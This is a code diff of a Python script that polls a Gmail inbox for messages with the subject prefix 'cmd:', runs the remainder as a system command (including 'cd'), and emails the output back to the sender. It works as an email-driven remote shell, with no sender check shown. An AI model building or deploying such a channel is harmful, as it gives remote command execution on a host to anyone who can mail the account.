@@ -5,9 +5,9 @@ from sys import argv
 from subprocess import run, PIPE 
 from time import strftime as date
 from threading import Thread
-from time import sleep
 from smtplib import SMTP
 from email.mime.text import MIMEText
+from os import chdir, getcwd
 
 getDate = lambda: "{}-{}".format(date("%d %m %y"), date("%H:%M:%S"))
 
@@ -23,7 +23,7 @@ class Mailer:
 		mime["From"] = self.user
 		mime["To"] = to
 		mime["Subject" ] = sbj 
-		mime = mime.as_string()
+		mime = mime.as_string()	 
 		self.mail.sendmail(self.user, to, mime)
 
 def getOutput(cmd):
@@ -38,12 +38,12 @@ def getFrom(f):
 	f = f[-1][1:-1]
 	return f
 
-def getCommands(conn, smtp):
+def getCommands(conn, smtp, selected="INBOX"):
 	lastmsj = ""
 	while True:
-		sleep(2)
 		try:
-			result, data = conn.uid("search", None, "HEADER Subject 'command:'") 
+			conn.select(selected)
+			result, data = conn.uid("search", None, "HEADER Subject 'cmd:'") 
 		except Exception as e:	
 			print(e)
 			continue
@@ -54,12 +54,16 @@ def getCommands(conn, smtp):
 			continue
 		else:
 			lastmsj = messajes[-1]
-			print("New msj.")
+			print("\nNew message!")
 		result, data = conn.uid("fetch", lastmsj, "(RFC822)")
 		raw = data[0][1].decode("utf-8")
 		mail = emailinfo(raw)
-		command = mail["Subject"][8:]
-		print(command)
+		command = mail["Subject"][4:]
+		if command[:2].lower() == "cd":
+			try:
+				chdir(command[3:])
+			except:
+				pass
 		out = getOutput(command)
 		sendto = getFrom(mail["From"])
 		smtp.send(out, sendto, "{} {}".format(command, getDate()))
@@ -71,7 +75,6 @@ def main():
 	smtp = Mailer(user, passw)
 	conn = imap("imap.gmail.com")
 	conn.login(user, passw)
-	conn.select("INBOX")
 	getmsj = Thread(target=getCommands, args=[conn, smtp,])
 	getmsj.daemon = True
 	getmsj.start()
